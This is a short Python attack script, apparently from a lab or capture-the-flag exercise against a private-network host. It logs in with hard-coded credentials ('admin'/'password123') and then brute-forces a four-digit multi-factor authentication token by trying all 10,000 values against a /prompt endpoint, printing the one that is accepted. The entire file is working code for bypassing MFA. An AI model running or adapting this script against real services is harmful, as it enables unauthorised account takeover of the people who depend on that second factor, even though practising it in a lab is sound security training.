#!/usr/bin/env python3
import requests


def login(url='http://10.102.11.192/login', username='admin', password='password123'):
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = {
        'username': username,
        'password': password
    }
    r = requests.post(url, headers=headers, data=data)
    # print(f'Login Response:\n{r.text}\n---\n\n')
    return r.cookies


def brute_force_token(cookies, url='http://10.102.11.192/prompt'):
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    for token in range(10000):
        padded_token = f'{token:04d}'
        data = {
            'mfa_token': padded_token
        }
        r = requests.post(url, headers=headers, cookies=cookies, data=data)
        if 'Invalid token' in r.text:
            cookies = r.cookies
        else:
            print(f'\nToken: {padded_token}\n')
            break


if __name__ == '__main__':
    session_cookie = login()
    brute_force_token(session_cookie)